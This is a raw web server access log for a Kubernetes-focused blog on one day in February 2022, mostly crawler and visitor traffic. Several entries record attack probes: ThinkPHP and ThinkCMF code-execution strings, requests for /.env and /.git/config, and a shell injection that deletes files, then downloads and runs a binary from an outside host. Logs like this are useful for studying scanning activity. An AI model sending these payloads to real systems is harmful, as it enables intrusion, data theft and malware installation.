66.249.79.31 - - [14/Feb/2022:10:01:43 +0100] "GET /assets/scripts/prismjs.js?v=37bff49e5b HTTP/1.1" 200 7123 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.76.247.150 - - [14/Feb/2022:10:03:57 +0100] "GET /kubernetes-headless-service/ HTTP/2.0" 200 16206 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:03:58 +0100] "GET /assets/styles/main.css?v=37bff49e5b HTTP/2.0" 200 14057 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:03:58 +0100] "GET /assets/scripts/main.js?v=37bff49e5b HTTP/2.0" 200 9977 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:03:58 +0100] "GET /content/images/size/w300/2021/10/d417ce9e68114f09acc670e5928685a3--5--1.png HTTP/2.0" 200 2741 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:03:58 +0100] "GET /assets/images/avatar.png?v=37bff49e5b HTTP/2.0" 200 1550 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:03:58 +0100] "GET /content/images/size/w2000/2021/10/Screenshot_8.png HTTP/2.0" 200 243714 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/obraz_2021-10-02_103514.png HTTP/2.0" 200 14588 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-1.png HTTP/2.0" 200 18781 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-2.png HTTP/2.0" 200 18100 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-8.png HTTP/2.0" 200 27358 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-9.png HTTP/2.0" 200 9699 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-10.png HTTP/2.0" 200 9335 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/image-14.png HTTP/2.0" 200 10295 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:00 +0100] "GET /content/images/2021/10/Kafka-Topic-Partition.drawio--2-.png HTTP/2.0" 200 28195 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
202.76.247.150 - - [14/Feb/2022:10:04:01 +0100] "GET /favicon.png HTTP/2.0" 200 2741 "https://krzwiatrzyk.eu/kubernetes-headless-service/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
167.94.145.58 - - [14/Feb/2022:10:11:02 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
167.94.145.58 - - [14/Feb/2022:10:11:02 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.58 - - [14/Feb/2022:10:11:02 +0100] "PRI * HTTP/2.0" 400 150 "-" "-"
167.94.145.58 - - [14/Feb/2022:10:11:02 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
45.146.165.37 - - [14/Feb/2022:10:18:03 +0100] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:10:18:03 +0100] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 595 "http://85.255.1.106:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.55.39.149 - - [14/Feb/2022:10:22:02 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [14/Feb/2022:10:22:11 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
170.239.29.201 - - [14/Feb/2022:10:23:48 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.79.29 - - [14/Feb/2022:10:31:43 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.27 - - [14/Feb/2022:10:31:44 +0100] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 13059 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.29 - - [14/Feb/2022:10:31:49 +0100] "GET /assets/images/tag-bg.svg?v=37bff49e5b HTTP/1.1" 200 1553 "https://krzwiatrzyk.eu/tag/kubernetes-advanced/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/97.0.4692.71 Safari/537.36"
51.254.49.99 - - [14/Feb/2022:10:38:53 +0100] "GET / HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
66.249.79.31 - - [14/Feb/2022:10:49:27 +0100] "GET /weekly-stories/ HTTP/1.1" 200 15398 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
20.191.45.212 - - [14/Feb/2022:10:52:50 +0100] "GET / HTTP/1.1" 301 162 "http://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [14/Feb/2022:10:52:51 +0100] "GET / HTTP/1.1" 200 13187 "https://krzwiatrzyk.eu/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
20.191.45.212 - - [14/Feb/2022:10:52:51 +0100] "GET /favicon.png HTTP/1.1" 200 2741 "https://krzwiatrzyk.eu/favicon.png" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
207.46.13.234 - - [14/Feb/2022:10:55:36 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.234 - - [14/Feb/2022:10:55:36 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.44 - - [14/Feb/2022:10:55:42 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.146.165.37 - - [14/Feb/2022:10:56:34 +0100] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:10:56:34 +0100] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 47 "http://85.255.1.106:80/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.79.29 - - [14/Feb/2022:11:08:16 +0100] "GET /tool-stack/ HTTP/1.1" 200 12444 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [14/Feb/2022:11:17:40 +0100] "GET /weekly-stories-2/ HTTP/1.1" 200 15972 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.165.37 - - [14/Feb/2022:11:27:28 +0100] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:11:27:28 +0100] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 595 "http://85.255.1.106:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
212.49.81.11 - - [14/Feb/2022:11:31:32 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
212.192.241.207 - - [14/Feb/2022:11:35:28 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
212.192.241.207 - - [14/Feb/2022:11:35:28 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.79.29 - - [14/Feb/2022:11:35:47 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
82.64.169.45 - - [14/Feb/2022:11:40:11 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
66.249.79.29 - - [14/Feb/2022:11:54:37 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 5999 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.219.170.25 - - [14/Feb/2022:11:57:14 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.219.170.25 - - [14/Feb/2022:11:57:14 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
45.146.165.37 - - [14/Feb/2022:12:01:34 +0100] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:12:01:34 +0100] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 595 "http://85.255.1.106:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
184.105.139.68 - - [14/Feb/2022:12:38:24 +0100] "GET / HTTP/1.1" 200 1345 "-" "-"
139.59.7.98 - - [14/Feb/2022:12:49:48 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
193.29.13.29 - - [14/Feb/2022:12:55:20 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
66.249.79.27 - - [14/Feb/2022:13:09:26 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [14/Feb/2022:13:09:27 +0100] "GET /assets/scripts/search.js?v=37bff49e5b HTTP/1.1" 200 5992 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.29 - - [14/Feb/2022:13:11:46 +0100] "GET /weekly-stories-2/ HTTP/1.1" 200 15972 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.25 - - [14/Feb/2022:13:21:12 +0100] "GET /weekly-stories-2/ HTTP/1.1" 200 15977 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
39.124.239.138 - - [14/Feb/2022:13:25:50 +0100] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "Hello, world"
23.95.100.141 - - [14/Feb/2022:13:26:55 +0100] "HEAD / HTTP/1.0" 301 0 "-" "-"
66.249.70.25 - - [14/Feb/2022:14:00:46 +0100] "GET /assets/images/avatar.png?v=37bff49e5b HTTP/1.1" 200 1550 "-" "Googlebot-Image/1.0"
179.43.159.4 - - [14/Feb/2022:14:05:41 +0100] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
114.119.145.25 - - [14/Feb/2022:14:15:31 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.83.65.178 - - [14/Feb/2022:14:35:17 +0100] "\x00\x0E8^\x98\xD9\x05\x00\x82\xCF\xF9\x00\x00\x00\x00\x00" 400 150 "-" "-"
130.43.72.6 - - [14/Feb/2022:14:37:55 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
179.43.159.4 - - [14/Feb/2022:14:43:28 +0100] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
67.207.89.123 - - [14/Feb/2022:14:57:16 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
67.207.89.123 - - [14/Feb/2022:14:57:16 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.70.27 - - [14/Feb/2022:15:00:46 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.25 - - [14/Feb/2022:15:00:46 +0100] "GET /content/images/2021/10/d417ce9e68114f09acc670e5928685a3--5--1.png HTTP/1.1" 304 0 "-" "Googlebot-Image/1.0"
193.29.13.29 - - [14/Feb/2022:15:24:58 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
66.249.70.29 - - [14/Feb/2022:15:37:56 +0100] "GET /weekly-stories-2/amp/ HTTP/1.1" 200 6568 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.149 - - [14/Feb/2022:15:43:14 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [14/Feb/2022:15:43:25 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
104.217.248.254 - - [14/Feb/2022:15:47:46 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
185.180.143.79 - - [14/Feb/2022:16:07:32 +0100] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.79 - - [14/Feb/2022:16:07:39 +0100] "GET /showLogin.cc HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
66.249.70.27 - - [14/Feb/2022:16:07:56 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.25 - - [14/Feb/2022:16:07:56 +0100] "GET /weekly-stories/amp/ HTTP/1.1" 200 6000 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.45.194.225 - - [14/Feb/2022:16:31:41 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S; 155292aaa8) Chrome/84.0.4147.105 Safari/537.36"
104.45.194.225 - - [14/Feb/2022:16:31:41 +0100] "GET / HTTP/1.1" 200 13172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S; 155292aaa8) Chrome/84.0.4147.105 Safari/537.36"
104.45.194.225 - - [14/Feb/2022:16:31:42 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S; 155292aaa8) Chrome/84.0.4147.105 Safari/537.36"
104.45.194.225 - - [14/Feb/2022:16:31:42 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; BW/1.1; bit.ly/2W6Px8S; 155292aaa8) Chrome/84.0.4147.105 Safari/537.36"
104.45.194.225 - - [14/Feb/2022:16:31:43 +0100] "" 400 0 "-" "-"
207.46.13.234 - - [14/Feb/2022:16:34:14 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.234 - - [14/Feb/2022:16:34:15 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.44 - - [14/Feb/2022:16:34:24 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
184.72.176.212 - - [14/Feb/2022:16:59:59 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
184.72.176.212 - - [14/Feb/2022:16:59:59 +0100] "GET /rss/ HTTP/1.1" 200 3449 "-" "Forem Feeds Importer"
176.107.188.214 - - [14/Feb/2022:17:45:26 +0100] "GET /.git/config HTTP/1.1" 301 162 "-" "python-requests/2.22.0"
142.147.99.156 - - [14/Feb/2022:17:58:55 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [14/Feb/2022:17:58:56 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [14/Feb/2022:18:01:56 +0100] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [14/Feb/2022:18:01:57 +0100] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
213.222.165.101 - - [14/Feb/2022:18:42:06 +0100] "GET / HTTP/1.0" 301 162 "-" "-"
185.173.35.25 - - [14/Feb/2022:18:54:15 +0100] "GET / HTTP/1.1" 301 162 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
185.173.35.25 - - [14/Feb/2022:18:54:16 +0100] "GET / HTTP/1.1" 200 1345 "http://85.255.1.106:80/" "Go http package"
207.46.13.234 - - [14/Feb/2022:19:12:11 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.234 - - [14/Feb/2022:19:12:12 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.44 - - [14/Feb/2022:19:12:20 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.140.248.32 - - [14/Feb/2022:19:16:44 +0100] "GET / HTTP/1.1" 200 595 "-" "python-requests/2.27.1"
157.55.39.149 - - [14/Feb/2022:20:00:52 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.79 - - [14/Feb/2022:20:00:58 +0100] "GET / HTTP/2.0" 200 13159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.137.21.134 - - [14/Feb/2022:20:07:33 +0100] "GET /dispatch.asp HTTP/1.1" 301 162 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
207.46.13.234 - - [14/Feb/2022:20:28:43 +0100] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.234 - - [14/Feb/2022:20:28:44 +0100] "GET /robots.txt HTTP/2.0" 200 108 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.44 - - [14/Feb/2022:20:28:46 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.70.27 - - [14/Feb/2022:20:44:58 +0100] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.27 - - [14/Feb/2022:20:44:58 +0100] "GET /assets/scripts/search.js?v=37bff49e5b HTTP/1.1" 200 5992 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.27 - - [14/Feb/2022:20:44:59 +0100] "GET /assets/scripts/prismjs.js?v=37bff49e5b HTTP/1.1" 200 7123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.189.10.196 - - [14/Feb/2022:20:51:25 +0100] "GET / HTTP/1.1" 301 162 "-" "-"
107.189.10.196 - - [14/Feb/2022:20:51:25 +0100] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
136.144.172.189 - - [14/Feb/2022:20:56:10 +0100] "GET / HTTP/1.1" 301 162 "-" "fasthttp"
200.58.91.189 - - [14/Feb/2022:20:56:17 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.70.25 - - [14/Feb/2022:21:14:58 +0100] "GET /weekly-stories-3/ HTTP/1.1" 200 15610 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.241.210.245 - - [14/Feb/2022:21:34:08 +0100] "GET /actuator/health HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
190.94.138.218 - - [14/Feb/2022:21:35:12 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
99.21.207.32 - - [14/Feb/2022:21:49:29 +0100] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
3.236.114.110 - - [14/Feb/2022:22:00:56 +0100] "GET /rss HTTP/1.1" 301 5 "-" "Forem Feeds Importer"
3.236.114.110 - - [14/Feb/2022:22:00:56 +0100] "GET /rss/ HTTP/1.1" 200 3444 "-" "Forem Feeds Importer"
193.111.50.81 - - [14/Feb/2022:22:07:32 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
193.111.50.81 - - [14/Feb/2022:22:08:14 +0100] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
58.250.251.12 - - [14/Feb/2022:22:14:13 +0100] "GET /invoker/readonly HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
